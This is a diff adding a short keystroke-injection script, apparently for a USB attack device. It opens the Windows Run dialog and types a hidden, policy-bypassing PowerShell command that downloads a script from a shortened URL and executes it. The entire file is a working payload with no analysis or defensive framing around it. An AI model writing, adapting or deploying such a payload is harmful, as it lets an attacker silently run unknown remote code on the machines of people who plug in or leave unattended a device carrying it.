@@ -1,0 +1,4 @@
+GUI r
+DELAY 600
+STRING powershell -w h -NoP -Ep Bypass $dc='';irm https://cutt.ly/5wc2uKad | iex
+ENTER
